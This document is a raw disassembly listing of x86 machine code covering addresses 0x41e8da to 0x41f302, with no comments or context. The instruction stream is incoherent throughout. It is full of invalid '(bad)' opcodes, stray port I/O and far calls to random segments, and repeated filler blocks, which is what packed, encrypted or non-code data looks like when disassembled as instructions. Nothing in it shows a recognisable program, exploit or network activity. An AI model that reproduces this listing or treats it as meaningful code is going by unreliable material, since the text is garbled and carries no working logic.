  41e8da:	scas   eax,DWORD PTR es:[edi]
  41e8db:	jl     0x41e943
  41e8dd:	sar    bl,1
  41e8df:	inc    ecx
  41e8e0:	test   DWORD PTR [ecx],0xa5ff1982
  41e8e6:	sbb    al,0xf3
  41e8e8:	adc    ebx,DWORD PTR [esi-0x69e8524]
  41e8ee:	sbb    ebp,DWORD PTR [ebp-0x58]
  41e8f1:	cs cli 
  41e8f3:	ficomp DWORD PTR [ebx+0x15]
  41e8f6:	pop    eax
  41e8f7:	repnz fwait
  41e8f9:	jae    0x41e8e7
  41e8fb:	dec    ebp
  41e8fc:	sbb    BYTE PTR [ebp+edx*1-0x630b34b2],dh
  41e903:	push   esi
  41e904:	sbb    DWORD PTR [edx],edx
  41e906:	icebp  
  41e907:	pop    esi
  41e908:	pop    es
  41e909:	and    eax,0xed1072b
  41e90e:	imul   ebp,DWORD PTR [edx],0xd4dc6df9
  41e914:	mov    bh,0xd4
  41e916:	mov    al,ds:0xeda40f8f
  41e91b:	into   
  41e91c:	shr    BYTE PTR [ebx],0xc7
  41e91f:	cdq    
  41e920:	add    ebx,DWORD PTR [edx+0x5c]
  41e923:	cmp    al,0xe4
  41e925:	mov    cl,0x8d
  41e927:	(bad)  
  41e928:	fdiv   DWORD PTR [ebx-0x402322a5]
  41e92e:	aad    0xfd
  41e930:	or     al,0x6
  41e932:	mov    al,ds:0xe26207ac
  41e937:	push   eax
  41e938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e939:	mov    BYTE PTR ss:[ebx+ebx*1],bl
  41e93d:	dec    esi
  41e93e:	mov    ds:0x8e0134d7,al
  41e943:	icebp  
  41e944:	lods   al,BYTE PTR ds:[esi]
  41e945:	not    BYTE PTR [esi]
  41e947:	leave  
  41e948:	stc    
  41e949:	fnstenv [edi]
  41e94b:	sbb    DWORD PTR [edi-0x60],edi
  41e94e:	sbb    BYTE PTR [ebx],cl
  41e950:	push   es
  41e951:	loop   0x41e925
  41e953:	mov    ah,0xfe
  41e955:	inc    edx
  41e956:	fwait
  41e957:	sbb    DWORD PTR [eax-0xb],ecx
  41e95a:	mov    bh,0xa1
  41e95c:	mov    DWORD PTR ds:0xa82edab5,ebx
  41e962:	pop    DWORD PTR [eax+0x43]
  41e965:	test   DWORD PTR [ecx-0x7d],0xebab4eb7
  41e96c:	sub    esp,DWORD PTR [edi+ecx*1+0x3d]
  41e970:	add    eax,0x50319b5e
  41e975:	add    esi,DWORD PTR [ecx-0x30f64774]
  41e97b:	cdq    
  41e97c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e97d:	shr    BYTE PTR [esi],1
  41e97f:	cwde   
  41e980:	push   eax
  41e981:	sub    DWORD PTR [edi-0x7c],ecx
  41e984:	xchg   edi,ebp
  41e986:	mov    WORD PTR [ebx+0x6dffb7be],ss
  41e98c:	les    ebx,FWORD PTR [edx]
  41e98e:	fs mov ebp,ss
	...
  41e9f1:	add    BYTE PTR [eax],al
  41e9f3:	add    BYTE PTR [eax-0x3],bh
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	test   al,0x31
  41ea02:	xor    al,0x4
  41ea04:	push   ss
  41ea05:	inc    esi
  41ea06:	add    DWORD PTR [eax],eax
  41ea08:	add    eax,0x33000001
  41ea0d:	fcomp  st(5)
  41ea0f:	xchg   edx,eax
  41ea10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea11:	dec    esi
  41ea12:	sbb    DWORD PTR [eax+0x11],esi
  41ea15:	mov    esi,DWORD PTR [edx+0x767d1455]
  41ea1b:	cmp    bh,BYTE PTR ds:0x7d239614
  41ea21:	dec    ebp
  41ea22:	push   edx
  41ea23:	imul   BYTE PTR [esp+eiz*2]
  41ea26:	push   ss
  41ea27:	xchg   edi,eax
  41ea28:	or     BYTE PTR [edi+0x49],0x27
  41ea2c:	or     DWORD PTR [ebx+0x38],0x65
  41ea30:	jo     0x41eaac
  41ea32:	mov    ah,BYTE PTR [edx]
  41ea34:	sbb    eax,ecx
  41ea36:	pop    eax
  41ea37:	(bad)  
  41ea39:	mov    edx,0xe698157d
  41ea3e:	in     al,0xd3
  41ea40:	pushf  
  41ea41:	aas    
  41ea42:	adc    dl,BYTE PTR [edi]
  41ea44:	jne    0x41ea15
  41ea46:	aas    
  41ea47:	nop
  41ea48:	dec    edx
  41ea49:	sub    esp,DWORD PTR [edi]
  41ea4b:	hlt    
  41ea4c:	mov    edi,DWORD PTR [ebp+0x1f]
  41ea4f:	push   ebp
  41ea50:	repz sub DWORD PTR [ebx+eiz*1+0x37],esi
  41ea55:	add    DWORD PTR [ebx],0xffffff97
  41ea58:	add    BYTE PTR [eax-0x71],dh
  41ea5b:	data16 mov dl,0xb8
  41ea5e:	sbb    eax,0xd472b534
  41ea63:	push   edx
  41ea64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea65:	adc    al,0xba
  41ea67:	sub    BYTE PTR [ecx+0x42],ah
  41ea6a:	push   esp
  41ea6b:	aam    0x43
  41ea6d:	push   es
  41ea6e:	ret    0x35b5
  41ea71:	xchg   ah,bh
  41ea73:	ror    DWORD PTR [edi-0x67],0xe7
  41ea77:	sbb    eax,0xfba8994d
  41ea7c:	(bad)  
  41ea7d:	outs   dx,BYTE PTR ds:[esi]
  41ea7e:	mov    WORD PTR [ecx],ds
  41ea80:	outs   dx,DWORD PTR ds:[esi]
  41ea81:	xor    al,0x56
  41ea83:	cld    
  41ea84:	push   cs
  41ea85:	sbb    cl,BYTE PTR [esi-0x36baef5a]
  41ea8b:	lock and dl,BYTE PTR [ebx+0x38]
  41ea8f:	push   ebp
  41ea90:	out    0x54,al
  41ea92:	test   DWORD PTR [esi*4+0x5b601493],esp
  41ea99:	adc    al,0x9d
  41ea9b:	ret    0x8e1
  41ea9e:	das    
  41ea9f:	push   ss
  41eaa0:	inc    ebx
  41eaa1:	pop    edi
  41eaa2:	xlat   BYTE PTR ds:[ebx]
  41eaa3:	(bad)  
  41eaa4:	jmp    0x41ea39
  41eaa6:	shr    esp,1
  41eaa8:	jecxz  0x41ea75
  41eaaa:	test   DWORD PTR [eax],0x7712548d
  41eab0:	add    BYTE PTR [ecx+0x5f],dl
  41eab3:	jge    0x41eb0d
  41eab5:	push   ebp
  41eab6:	mov    ds:0x7bbd30ec,eax
  41eabb:	js     0x41ea8a
  41eabd:	or     edx,DWORD PTR [edi]
  41eabf:	sar    BYTE PTR [ebx],0x85
  41eac2:	jnp    0x41eb2c
  41eac4:	mov    ebp,0x3e810325
  41eac9:	push   esi
  41eaca:	and    esi,DWORD PTR [ecx+0x102f7535]
  41ead0:	push   ebx
  41ead1:	jg     0x41eb3f
  41ead3:	test   BYTE PTR [edi-0x3009b56c],bl
  41ead9:	retf   
  41eada:	inc    ecx
  41eadb:	inc    ecx
  41eadc:	test   BYTE PTR [eax],bl
  41eade:	ds xor al,0x8f
  41eae1:	loopne 0x41eb2f
  41eae3:	inc    ecx
  41eae4:	(bad)  
  41eae5:	mov    eax,DWORD PTR [esi+0x18]
  41eae8:	and    al,0x62
  41eaea:	ror    ah,cl
  41eaec:	or     BYTE PTR [esi+0x14],0x66
  41eaf0:	jno    0x41eb59
  41eaf2:	add    esi,DWORD PTR [esi]
  41eaf4:	sub    al,0x43
  41eaf6:	and    al,0x99
  41eaf8:	out    0xf3,al
  41eafa:	xor    esi,esp
  41eafc:	jns    0x41ea7e
  41eafe:	inc    edx
  41eaff:	xchg   ecx,eax
  41eb00:	mov    ds:0x522e0e20,eax
  41eb05:	pusha  
  41eb06:	xchg   esp,eax
  41eb07:	out    dx,al
  41eb08:	es pop esp
  41eb0a:	xor    dh,BYTE PTR [ebp-0x43]
  41eb0d:	mov    bh,ch
  41eb0f:	adc    edi,esi
	...
  41eb71:	add    BYTE PTR [eax],al
  41eb73:	add    BYTE PTR [edx],dl
  41eb75:	das    
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0x65
  41eb81:	or     eax,0x471b5dfd
  41eb86:	add    DWORD PTR [eax],eax
  41eb88:	add    eax,0x4d000001
  41eb8d:	mov    ds:0x9c2bf5bd,eax
  41eb92:	adc    al,0xc6
  41eb94:	pop    esi
  41eb95:	pop    es
  41eb96:	dec    edi
  41eb97:	rcl    ch,cl
  41eb99:	leave  
  41eb9a:	xor    DWORD PTR [edx-0x20],0xffffffd9
  41eb9e:	cmc    
  41eb9f:	mov    esp,0x5c140895
  41eba4:	mov    cs,WORD PTR [edx-0x74ce5a41]
  41ebaa:	and    eax,0x8c1e9d66
  41ebaf:	jno    0x41ec15
  41ebb1:	mov    BYTE PTR ds:0x54bf2971,dh
  41ebb7:	or     eax,0x51599d8f
  41ebbc:	(bad)  [ebx]
  41ebbe:	inc    esp
  41ebbf:	imul   esi,eax,0xfffffffe
  41ebc2:	mov    WORD PTR [ebp+0x122c02ba],gs
  41ebc8:	inc    edi
  41ebc9:	shl    bh,cl
  41ebcb:	or     eax,0xd2e44541
  41ebd0:	cmp    dl,BYTE PTR [edi-0xd]
  41ebd3:	push   0xa0719f3
  41ebd8:	int    0x3e
  41ebda:	xchg   esp,eax
  41ebdb:	push   eax
  41ebdc:	stos   DWORD PTR es:[edi],eax
  41ebdd:	add    al,0xb1
  41ebdf:	outs   dx,BYTE PTR ds:[esi]
  41ebe0:	(bad)  
  41ebe1:	cmc    
  41ebe2:	push   esi
  41ebe3:	loop   0x41ec31
  41ebe5:	push   esp
  41ebe6:	xchg   ebp,eax
  41ebe7:	xchg   edi,eax
  41ebe8:	add    DWORD PTR [edx+ecx*2-0x6d44eca1],esp
  41ebef:	mov    bh,0xca
  41ebf1:	call   0x6db5:0x3477d769
  41ebf8:	jb     0x41ec72
  41ebfa:	dec    ecx
  41ebfb:	or     BYTE PTR [ecx],0x9c
  41ebfe:	and    ch,BYTE PTR [eax-0x34]
  41ec01:	xchg   ebp,eax
  41ec02:	in     al,0x84
  41ec04:	and    BYTE PTR ds:0x3ab54e51,bl
  41ec0a:	sub    eax,0x412a33bd
  41ec0f:	jecxz  0x41ebf6
  41ec11:	enter  0x46bc,0x4d
  41ec15:	add    dl,BYTE PTR [edx]
  41ec17:	push   ecx
  41ec18:	xchg   esi,eax
  41ec19:	idiv   DWORD PTR [edx+0x13aa7389]
  41ec1f:	sub    eax,DWORD PTR [ecx+0xf]
  41ec22:	sub    cl,BYTE PTR [edi+ebx*8-0x5e]
  41ec26:	sub    eax,0x5b411b86
  41ec2b:	(bad)  
  41ec2d:	sbb    eax,0xf618fd43
  41ec32:	icebp  
  41ec33:	cmp    edi,DWORD PTR [edx-0x62dbbcd0]
  41ec39:	popf   
  41ec3a:	jl     0x41ec3c
  41ec3c:	fstp   QWORD PTR [ebx+0x48ee6aca]
  41ec42:	pop    ebp
  41ec43:	aad    0x19
  41ec45:	xchg   ebx,eax
  41ec46:	mov    bh,0x88
  41ec48:	push   esi
  41ec49:	mov    cs,WORD PTR [esi*4-0x7469df2]
  41ec50:	cmp    al,0x86
  41ec52:	lods   al,BYTE PTR ds:[esi]
  41ec53:	stc    
  41ec54:	cmp    DWORD PTR [edi-0xb49e65c],eax
  41ec5a:	es mov ah,0x16
  41ec5d:	aam    0x4b
  41ec5f:	or     BYTE PTR [esi+0x69],0xdf
  41ec63:	mov    WORD PTR [esi+ebx*2-0x9],?
  41ec67:	fidivr DWORD PTR [ebp+0x10]
  41ec6a:	jnp    0x41ec3a
  41ec6c:	mov    BYTE PTR [ecx+esi*1-0x5f],ah
  41ec70:	xor    BYTE PTR [ecx+ebx*1-0x2da28b65],0xb3
  41ec78:	jmp    0xe0a1044b
  41ec7d:	or     eax,DWORD PTR [edx+0xe]
  41ec80:	adc    edx,DWORD PTR [ebx+0x1a971d58]
  41ec86:	sub    ah,dl
  41ec88:	push   edi
  41ec89:	mov    bh,0xc7
  41ec8b:	div    DWORD PTR [ebx]
  41ec8d:	pop    edi
  41ec8e:	ds dec edx
  41ec90:	dec    esp
	...
  41ecf1:	add    BYTE PTR [eax],al
  41ecf3:	add    BYTE PTR [ecx-0xf],al
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0xe2a95fd0
  41ed02:	push   edx
  41ed03:	(bad)  
  41ed04:	and    BYTE PTR [eax+0x1],cl
  41ed07:	add    BYTE PTR ds:0x3c000001,al
  41ed0d:	jne    0x41ed7b
  41ed0f:	addr16 sbb edx,esi
  41ed12:	cdq    
  41ed13:	inc    esp
  41ed14:	(bad)
  41ed18:	inc    edi
  41ed19:	adc    ebp,0xc2303690
  41ed1f:	aad    0x45
  41ed21:	imul   edx,DWORD PTR [ecx+0x6e5987e6],0xc7722d19
  41ed2b:	mov    BYTE PTR [edi-0x6b],ah
  41ed2e:	stos   BYTE PTR es:[edi],al
  41ed2f:	dec    esi
  41ed30:	xchg   edx,eax
  41ed31:	mov    eax,0xdb716773
  41ed36:	push   edi
  41ed37:	inc    esi
  41ed38:	sbb    al,BYTE PTR [esi-0x36cac257]
  41ed3e:	inc    eax
  41ed3f:	push   cs
  41ed40:	jl     0x41ed52
  41ed42:	xlat   BYTE PTR ds:[ebx]
  41ed43:	lods   eax,DWORD PTR ds:[esi]
  41ed44:	(bad)  
  41ed45:	call   0x9096:0x114cb841
  41ed4c:	add    edx,DWORD PTR [ecx-0x1697acf]
  41ed52:	aaa    
  41ed53:	cmp    al,0x72
  41ed55:	in     eax,0xb4
  41ed57:	in     eax,0xe4
  41ed59:	mov    dh,0x16
  41ed5b:	sbb    BYTE PTR [ebp+0x39859466],al
  41ed61:	or     ebp,ebp
  41ed63:	stc    
  41ed64:	push   ebx
  41ed65:	inc    ebx
  41ed66:	push   ecx
  41ed67:	xchg   esp,eax
  41ed68:	mul    BYTE PTR ds:0x11fc5b75
  41ed6e:	jmp    0x41ed4f
  41ed70:	aas    
  41ed71:	imul   ecx,DWORD PTR [ecx+esi*1+0x2b],0x9f9398f
  41ed79:	and    eax,0xcef300a8
  41ed7e:	(bad)  
  41ed7f:	lahf   
  41ed80:	jmp    0x41ed5f
  41ed82:	push   es
  41ed83:	sti    
  41ed84:	(bad)
  41ed88:	xchg   ebx,eax
  41ed89:	popa   
  41ed8a:	ror    ch,0xc
  41ed8d:	jno    0x41ed57
  41ed8f:	test   al,0x3b
  41ed91:	mov    esi,0xe26308df
  41ed96:	pop    ecx
  41ed97:	sbb    eax,0xd5016798
  41ed9c:	ss pushf 
  41ed9e:	mov    eax,ds:0x66de6b35
  41eda3:	xchg   esp,eax
  41eda4:	aaa    
  41eda5:	mov    ah,0x26
  41eda7:	(bad)  
  41eda8:	bound  ebp,QWORD PTR [esi+0x61]
  41edab:	mov    fs,WORD PTR [ecx-0x57]
  41edae:	shl    al,1
  41edb0:	push   ebx
  41edb1:	mov    edx,0xf4c7f72f
  41edb6:	sar    ecx,1
  41edb8:	lods   al,BYTE PTR ds:[esi]
  41edb9:	fcom   QWORD PTR [edx]
  41edbb:	sar    BYTE PTR [esp+ebx*1-0x16],1
  41edbf:	jb     0x41edce
  41edc1:	inc    edi
  41edc2:	push   ecx
  41edc3:	add    al,0x4d
  41edc5:	push   ss
  41edc6:	mov    BYTE PTR [edx],dh
  41edc8:	je     0x41ed96
  41edca:	les    edx,FWORD PTR [esi]
  41edcc:	xor    ch,BYTE PTR [esi+0x32]
  41edcf:	ins    BYTE PTR es:[edi],dx
  41edd0:	and    al,0x65
  41edd2:	enter  0x25d0,0x32
  41edd6:	(bad)  
  41edd7:	pop    edx
  41edd8:	sub    BYTE PTR [edi-0x397b72be],dl
  41edde:	popf   
  41eddf:	sub    eax,0x2879c51e
  41ede4:	inc    edx
  41ede5:	add    al,0xee
  41ede7:	push   cs
  41ede8:	fist   DWORD PTR [ebx+0x73]
  41edeb:	test   eax,0x3ac97cca
  41edf0:	(bad)  
  41edf1:	xor    BYTE PTR [edx+0x53f733d6],ah
  41edf7:	sub    DWORD PTR [edi+0x3f],esi
  41edfa:	mov    esp,0x2d2c85f
  41edff:	ins    DWORD PTR es:[edi],dx
  41ee00:	cld    
  41ee01:	repz jge 0x41ede9
  41ee04:	stos   BYTE PTR es:[edi],al
  41ee05:	jb     0x41ee29
  41ee07:	or     ecx,esi
  41ee09:	xchg   esp,eax
  41ee0a:	cli    
  41ee0b:	pop    ss
  41ee0c:	adc    ch,BYTE PTR [edi-0x56]
  41ee0f:	jmp    0x41eedf
	...
  41ee74:	add    eax,0x7b197956
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0x25ba:0xcbf278e7
  41ee85:	dec    ecx
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    eax,0x29000001
  41ee8d:	dec    ecx
  41ee8e:	mov    ch,0x1b
  41ee91:	mov    ebp,0xc0a90cde
  41ee96:	mov    esi,0x6f4a540b
  41ee9b:	push   edx
  41ee9c:	add    BYTE PTR [edx+0x3e67ee54],cl
  41eea2:	nop
  41eea3:	popf   
  41eea4:	xchg   ebx,eax
  41eea5:	or     DWORD PTR [ecx-0x4eb73b8f],0x33
  41eeac:	dec    ebx
  41eead:	dec    ecx
  41eeae:	int    0x46
  41eeb0:	mov    ebx,0x8014b161
  41eeb5:	or     dh,bl
  41eeb7:	adc    al,0x68
  41eeb9:	dec    eax
  41eeba:	jnp    0x41ee56
  41eebc:	xor    BYTE PTR [eax+0x2be200a2],0xc5
  41eec3:	xchg   edx,eax
  41eec4:	and    ebp,ebx
  41eec6:	sti    
  41eec7:	sub    al,0x5a
  41eec9:	aam    0x39
  41eecb:	ins    DWORD PTR es:[edi],dx
  41eecc:	cmp    bl,BYTE PTR [edx+0xe]
  41eecf:	int3   
  41eed0:	adc    al,0x64
  41eed2:	cmp    dh,dh
  41eed4:	(bad)  
  41eed5:	xor    ebp,DWORD PTR [edi-0x15f6bb6c]
  41eedb:	gs adc eax,0x61263ee0
  41eee1:	call   0x1f6a:0x94720970
  41eee8:	iret   
  41eee9:	xchg   ecx,eax
  41eeea:	ror    DWORD PTR [ebp+0x46],cl
  41eeed:	cmp    eax,0x9f48b13d
  41eef2:	pop    ecx
  41eef3:	inc    esi
  41eef4:	shl    BYTE PTR [eax-0x6d],cl
  41eef7:	outs   dx,BYTE PTR ds:[esi]
  41eef8:	sbb    BYTE PTR [esi],bl
  41eefa:	int    0xf7
  41eefc:	aas    
  41eefd:	retf   
  41eefe:	repnz das 
  41ef00:	cs call 0x8f1b:0x121df68a
  41ef08:	or     al,0x86
  41ef0a:	bnd jl 0x41ef53
  41ef0d:	sub    esp,esi
  41ef0f:	add    BYTE PTR [ecx],ch
  41ef11:	jns    0x41ef43
  41ef13:	nop
  41ef14:	jne    0x41eeb9
  41ef16:	mov    bl,0x6a
  41ef18:	repz ja 0x41ef2a
  41ef1b:	lds    ecx,FWORD PTR [eax]
  41ef1d:	aaa    
  41ef1e:	shl    DWORD PTR [edx+edx*8],1
  41ef21:	cmc    
  41ef22:	aad    0x30
  41ef24:	nop
  41ef25:	or     ch,BYTE PTR [ebp-0x66]
  41ef28:	iret   
  41ef29:	or     BYTE PTR [ebx+0x62],0xfb
  41ef2d:	mov    esi,DWORD PTR [ecx+ecx*1-0x5ab6fa93]
  41ef34:	add    DWORD PTR [eax],esp
  41ef36:	sub    ebp,DWORD PTR [ebp-0x28]
  41ef39:	xchg   edi,eax
  41ef3a:	loopne 0x41efb4
  41ef3c:	mov    dh,0x58
  41ef3e:	loopne 0x41ef97
  41ef40:	xchg   ebp,eax
  41ef41:	(bad)  
  41ef42:	lea    eax,[ecx+0xa0a59e7]
  41ef48:	adc    dl,BYTE PTR [ebx]
  41ef4a:	gs push es
  41ef4c:	add    BYTE PTR [eax-0x73cc70bf],cl
  41ef52:	outs   dx,BYTE PTR ds:[esi]
  41ef53:	jmp    0x41efa0
  41ef55:	std    
  41ef56:	inc    ecx
  41ef57:	jecxz  0x41efa6
  41ef59:	(bad)  [esi]
  41ef5b:	hlt    
  41ef5c:	sub    eax,0x2f329da4
  41ef61:	mov    bh,0x53
  41ef63:	inc    edi
  41ef64:	pushf  
  41ef65:	arpl   WORD PTR [edi],bx
  41ef67:	mov    WORD PTR [ecx-0x6b],?
  41ef6a:	out    0x79,al
  41ef6c:	pushf  
  41ef6d:	mov    dh,0x7c
  41ef6f:	jge    0x41efb0
  41ef71:	mov    cl,0x8
  41ef73:	lods   al,BYTE PTR ds:[esi]
  41ef74:	cld    
  41ef75:	and    edx,eax
  41ef77:	fcomp  QWORD PTR ds:0x84b2f5d8
  41ef7d:	ret    0x9ae9
  41ef80:	shl    BYTE PTR [esi],1
  41ef82:	push   ds
  41ef83:	and    ch,BYTE PTR [ebp-0x62878fc]
  41ef89:	mov    edx,0x6b7f79ff
  41ef8e:	push   esp
  41ef8f:	jae    0x41efa5
	...
  41eff1:	add    BYTE PTR [eax],al
  41eff3:	add    BYTE PTR [ecx-0xda40a3],bh
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul edx,DWORD PTR [edi+0x2f],0xffffffc0
  41f003:	mov    ch,0x2a
  41f005:	dec    edx
  41f006:	add    DWORD PTR [eax],eax
  41f008:	add    eax,0xef000001
  41f00d:	sbb    al,0x64
  41f00f:	pop    eax
  41f010:	push   ebp
  41f011:	adc    DWORD PTR [ecx+0x6ead2f64],ebp
  41f017:	mov    edx,0xad60940d
  41f01c:	xchg   edx,eax
  41f01d:	dec    edx
  41f01e:	les    edi,FWORD PTR [eax-0x51]
  41f021:	inc    eax
  41f022:	adc    eax,0xae0bcf75
  41f027:	mov    al,ds:0x2e04966e
  41f02c:	test   al,0xb6
  41f02e:	ficomp DWORD PTR [ebp+0x61]
  41f031:	mov    WORD PTR [eax+0xbb1675],fs
  41f037:	fbld   TBYTE PTR [eax+ecx*2-0x53edd30d]
  41f03e:	icebp  
  41f03f:	js     0x41f08a
  41f041:	cmp    ecx,DWORD PTR [ebp+0x21]
  41f044:	pop    ebp
  41f045:	push   cs
  41f046:	push   cs
  41f047:	cmp    BYTE PTR ds:0x187dcfd3,dl
  41f04d:	jle    0x41f069
  41f04f:	lahf   
  41f050:	out    dx,al
  41f051:	jmp    0x987:0x98ea5363
  41f058:	and    al,0xf6
  41f05a:	dec    esi
  41f05b:	jno    0x41f065
  41f05d:	js     0x41f088
  41f05f:	fbstp  TBYTE PTR [ebp+0x7c]
  41f062:	idiv   BYTE PTR ds:0x83ae19dd
  41f068:	mov    al,0xb
  41f06a:	jmp    0x6bb8bf4
  41f06f:	dec    ebp
  41f070:	cmp    DWORD PTR [ebx+0xd891319],eax
  41f076:	sub    al,0x3c
  41f078:	call   0xe4b94efb
  41f07d:	mov    esi,0xfa96436d
  41f082:	push   ss
  41f083:	clc    
  41f084:	mov    dl,0x42
  41f086:	inc    ebp
  41f087:	mov    edi,0x5f950887
  41f08c:	push   es
  41f08d:	xor    BYTE PTR [edx-0x1a67eaba],0xd5
  41f094:	xlat   BYTE PTR ds:[ebx]
  41f095:	ret    
  41f096:	inc    ebp
  41f097:	mov    ecx,0x8ccbb0a5
  41f09c:	jecxz  0x41f055
  41f09e:	mov    ah,0xb
  41f0a0:	fisubr DWORD PTR [ecx+0x24c3cea0]
  41f0a6:	pop    edi
  41f0a7:	inc    eax
  41f0a8:	sub    al,0xe
  41f0aa:	test   ecx,esp
  41f0ac:	cld    
  41f0ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0af:	dec    edx
  41f0b0:	call   0x8977:0x3fd47a0c
  41f0b7:	in     eax,0x8f
  41f0b9:	sub    cl,dh
  41f0bb:	fbstp  TBYTE PTR [edi-0x2]
  41f0be:	and    BYTE PTR [esi-0x6d],ah
  41f0c1:	sbb    DWORD PTR [ecx-0x80],edi
  41f0c4:	ins    BYTE PTR es:[edi],dx
  41f0c5:	test   BYTE PTR [ecx+0xf0b4c9f],cl
  41f0cb:	lea    ebx,[eax]
  41f0cd:	xor    eax,0xa1f0140d
  41f0d2:	loopne 0x41f106
  41f0d4:	in     eax,dx
  41f0d5:	dec    ecx
  41f0d6:	add    al,0xfc
  41f0d8:	dec    edx
  41f0d9:	inc    edx
  41f0da:	mov    ebp,0xf084e526
  41f0df:	push   es
  41f0e0:	push   0xfea65d4
  41f0e5:	mov    bh,ah
  41f0e7:	aaa    
  41f0e8:	outs   dx,BYTE PTR ds:[esi]
  41f0e9:	jp     0x41f09b
  41f0eb:	cmp    eax,0xf56d174
  41f0f0:	and    al,0x9d
  41f0f2:	dec    ecx
  41f0f3:	call   0xa6d5:0xe7f31b12
  41f0fa:	mov    al,0x5b
  41f0fc:	push   eax
  41f0fd:	out    0xfe,al
  41f0ff:	jnp    0x41f11e
  41f101:	push   0xd415886b
  41f106:	je     0x41f08a
  41f108:	jo     0x41f0e1
  41f10a:	(bad)  
  41f10b:	out    0x8c,eax
  41f10d:	xchg   DWORD PTR [edx-0x7a],ecx
  41f110:	or     eax,0x0
	...
  41f171:	add    BYTE PTR [eax],al
  41f173:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4b2f:0x604ee63a
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    eax,0x80000001
  41f18d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f18e:	test   DWORD PTR [edx],esp
  41f190:	imul   BYTE PTR [edx+0x3c014b8e]
  41f196:	jp     0x41f195
  41f198:	rol    ecx,cl
  41f19a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f19b:	xor    bl,BYTE PTR [esi+0x48ea4768]
  41f1a1:	mov    edx,ds
  41f1a3:	repz int 0xf6
  41f1a6:	es cs mov ch,0xd8
  41f1aa:	test   al,0x46
  41f1ac:	jns    0x41f158
  41f1ae:	mov    cl,0x3f
  41f1b0:	or     eax,0x142973a7
  41f1b5:	add    al,0x71
  41f1b7:	jmp    DWORD PTR [esi+edi*8+0x3331b85f]
  41f1be:	adc    edx,DWORD PTR [ebp-0x64fc5411]
  41f1c4:	mov    eax,0x7e3538ff
  41f1c9:	and    edi,edi
  41f1cb:	sub    al,0xe0
  41f1cd:	xchg   edi,eax
  41f1ce:	repz mov dl,0xec
  41f1d1:	and    bh,bl
  41f1d3:	outs   dx,BYTE PTR ds:[esi]
  41f1d4:	rcl    BYTE PTR [eax],0xc1
  41f1d7:	clc    
  41f1d8:	cwde   
  41f1d9:	scas   al,BYTE PTR es:[edi]
  41f1da:	mov    cl,0x13
  41f1dc:	(bad)  
  41f1de:	push   esp
  41f1df:	aad    0xe4
  41f1e1:	loop   0x41f1a8
  41f1e3:	push   edx
  41f1e4:	fist   WORD PTR [ecx-0x73880ef2]
  41f1ea:	sti    
  41f1eb:	clc    
  41f1ec:	mov    dh,0x99
  41f1ee:	xor    ch,BYTE PTR [eax+0x1e298001]
  41f1f4:	xor    eax,0x59eec5dc
  41f1f9:	dec    ebx
  41f1fa:	test   esp,edx
  41f1fc:	pushf  
  41f1fd:	repnz push esi
  41f1ff:	mov    ecx,?
  41f201:	cmp    cl,BYTE PTR ds:0xae914373
  41f207:	cmc    
  41f208:	inc    eax
  41f209:	sbb    DWORD PTR [edx],0xffffff91
  41f20c:	call   0x539fb95c
  41f211:	pushf  
  41f212:	hlt    
  41f213:	mov    ebp,0xd1270ee6
  41f218:	outs   dx,DWORD PTR ds:[esi]
  41f219:	(bad)
  41f21d:	aad    0x5e
  41f21f:	jmp    0xb2053af9
  41f224:	sub    ch,BYTE PTR [ebp+eax*8-0x398481d7]
  41f22b:	or     dh,0x9f
  41f22e:	fcmovne st,st(1)
  41f230:	inc    eax
  41f231:	pop    edx
  41f232:	call   0x44e9:0x778c188c
  41f239:	sbb    eax,0x43bde9c
  41f23e:	lods   al,BYTE PTR ds:[esi]
  41f23f:	mov    ah,0x6e
  41f241:	jb     0x41f2a2
  41f243:	inc    esp
  41f244:	call   0xe921:0x47ab4341
  41f24b:	leave  
  41f24c:	je     0x41f275
  41f24e:	mov    ecx,0x4869f0b7
  41f253:	or     BYTE PTR [edi+eiz*8+0x71],ah
  41f257:	test   DWORD PTR [edx],esi
  41f259:	outs   dx,BYTE PTR ds:[esi]
  41f25a:	push   esi
  41f25b:	les    esi,FWORD PTR [ebx+0x3a82d7e5]
  41f261:	ret    
  41f262:	jno    0x41f1fc
  41f264:	ins    DWORD PTR es:[edi],dx
  41f265:	push   ebp
  41f266:	mov    ds:0x58f75fdf,al
  41f26b:	inc    eax
  41f26c:	inc    ecx
  41f26d:	or     bh,cl
  41f26f:	fld    st(1)
  41f271:	das    
  41f272:	aas    
  41f273:	ror    edx,1
  41f275:	sbb    BYTE PTR [ebp+0x748a398],dh
  41f27b:	xchg   ecx,eax
  41f27c:	inc    edi
  41f27d:	mov    ecx,0xa27cd4c8
  41f282:	fs jns 0x41f2ac
  41f285:	int    0x73
  41f287:	in     al,0x71
  41f289:	xor    dh,dl
  41f28b:	in     al,0x4d
  41f28d:	jo     0x41f2fd
  41f28f:	dec    ebp
  41f290:	dec    edi
	...
  41f2f1:	add    BYTE PTR [eax],al
  41f2f3:	add    BYTE PTR [ecx+0x1b],dl
  41f2f6:	jmp    DWORD PTR [esi-0x1]
  41f2f9:	out    0xd9,al
  41f2fb:	aas    
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f29a
  41f301:	inc    esp
  41f302:	push   esp
